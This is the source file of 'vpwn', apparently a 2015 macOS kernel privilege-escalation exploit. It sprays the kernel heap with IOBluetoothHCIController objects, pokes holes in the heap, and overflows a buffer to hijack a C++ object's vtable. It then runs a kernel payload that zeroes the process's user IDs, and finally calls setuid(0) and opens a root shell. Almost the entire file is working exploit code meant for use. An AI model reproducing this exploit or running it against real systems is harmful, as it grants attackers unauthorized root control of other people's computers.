//
//  main.m
//  vpwn
//
//  Created by qwertyoruiop on 15/03/15.
//  Copyright (c) 2015 hax llc. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "lsym_priv.h"

#define HEAP_OBJECTS 0x1000

io_connect_t kernel_iokit_conn(char* service, uint32_t idt) {
    kern_return_t err;
    CFMutableDictionaryRef matching = IOServiceMatching(service);
    io_iterator_t iterator;
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
    io_service_t sv = IOIteratorNext(iterator);
    if (sv == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return 0;
    }
    
    io_connect_t conn = MACH_PORT_NULL;
    err = IOServiceOpen(sv, mach_task_self(), idt, &conn);
    if (err) return 0;
    else return conn;
}


uint64_t kernel_alloc(uint64_t size, char cpp) {
    if (size <= 16) {
        return 0; // Unimplemented
    } else if (size <= 32) {
        return 0; // Unimplemented
    } else if (size <= 64) {
        return 0; // Unimplemented
    } else if (size <= 128) {
        return 0; // Unimplemented
    } else if (size <= 256) {
        return 0; // Unimplemented
    } else if (size <= 512) {
        if (cpp) {
            return kernel_iokit_conn("IOBluetoothHCIController", 0);
        } else return 0; // Unimplemented
    } else if (size <= 1024) {
        return 0; // Unimplemented
    }
    return 0;
}


void kernel_dealloc(uint64_t conn) {
    for (int i = 0; i < 16; i++) {
        IOConnectRelease((io_connect_t  )conn);
    }
}

#define LinkKernel(return_type, arguments, sym_var) return_type (*sym_var)arguments = (return_type (*)arguments) dsym##sym_var;
#define PrelinkSym(map, sym_var, sym_name) dsym##sym_var = lsym_slide_pointer(lsym_find_symbol(map, sym_name));
#define DefineSym(sym_var) static uint64_t dsym##sym_var = 0;

DefineSym(current_proc);
DefineSym(proc_ucred);
DefineSym(posix_cred_get);

static char kernel_payload_ran = 0;

void kernel_payload() {
    /*
     In kernel mode now.
     Stack is limited.
     Use DefineSym / PrelinkSym / LinkKernel to use kernel functions.
     SMEP is disabled at this stage.
     */

    typedef struct creds {
        uid_t	cr_uid;			/* effective user id */
        uid_t	cr_ruid;		/* real user id */
        uid_t	cr_svuid;		/* saved user id */
    } cred_t;
    
    LinkKernel(void*, (void), current_proc);
    LinkKernel(void*, (void*), proc_ucred);
    LinkKernel(cred_t*, (void*), posix_cred_get);

    void* cur_proc = current_proc();
    void* cur_ucred = proc_ucred(cur_proc);
    cred_t* pcred = posix_cred_get(cur_ucred);
    pcred->cr_ruid = 0; // get r00t
    pcred->cr_svuid = 0; // get r00t
    
    kernel_payload_ran = 1;
}

int main(int argc, const char * argv[]) {
    
    /*
        Heap overflow will overwrite a C++ Object created via kernel_alloc(..., 1);.
        We use Heap Feng Shui to achieve that.
     
        We control an interesting data structure. The first 8 bytes are a pointer table. kernel_dealloc will trigger a call to that C++ object and execute the 5th pointer in the table (table[4]).
     */
    sync();
    printf("[i] Preparing payload...\n");

    lsym_map_t* mapping_kernel = lsym_map_file("/mach_kernel");
    if (!mapping_kernel) {
        mapping_kernel = lsym_map_file("/System/Library/Kernels/kernel");
    }

    PrelinkSym(mapping_kernel, current_proc, "_current_proc");
    PrelinkSym(mapping_kernel, proc_ucred, "_proc_ucred");
    PrelinkSym(mapping_kernel, posix_cred_get, "_posix_cred_get");

    uint64_t payload[1];
    void** vtable = alloc((void*)0x1337100000, 0x1000);
    payload[0] = (uint64_t)vtable;
    
    if(!lsym_payload((uint64_t*)&vtable[0], (uint64_t*)&vtable[4], LSYM_PAYLOAD_VTABLE, (void*)kernel_payload))
    {
	printf("[-] Could not build the payload.\n");
	exit(1);
    }
    printf("[+] Payload successfully crafted.\n");
    printf("[i] Manipulating the heap...\n");
    
    uint64_t alloc_table[HEAP_OBJECTS];
    
    for (int i=0; i < HEAP_OBJECTS; i++) {
        alloc_table[i] = kernel_alloc(lsym_heap_overflow_bufsize(), 1); // allocate a c++ object in kernel heap
    }
    
    for (int i=HEAP_OBJECTS / 4; i < 3 * (HEAP_OBJECTS / 4); i++) {
        if (i % 2) {
            kernel_dealloc(alloc_table[i]); // poke holes
            alloc_table[i] = 0;
        }
    }
    
    printf("[i] Exploit loaded.\n");

    if (!lsym_heap_overflow((void*)payload, sizeof(payload)))
    {
        printf("[-] Heap overflow unsuccessful.\n");
    }
    
    
    for (int i=0; i < HEAP_OBJECTS; i++) {
        if(alloc_table[i])
            kernel_dealloc(alloc_table[i]); // free heap spray. when overflown object is free'd, payload runs.
    }
    

    if (kernel_payload_ran) {
        setuid(0);
        if (getuid() == 0) {
            printf("[+] got r00t\n");
            system("/bin/sh");
            exit(0);
        }
    }
    printf("[-] kernel payload did not execute.\n");
    return 255;
}
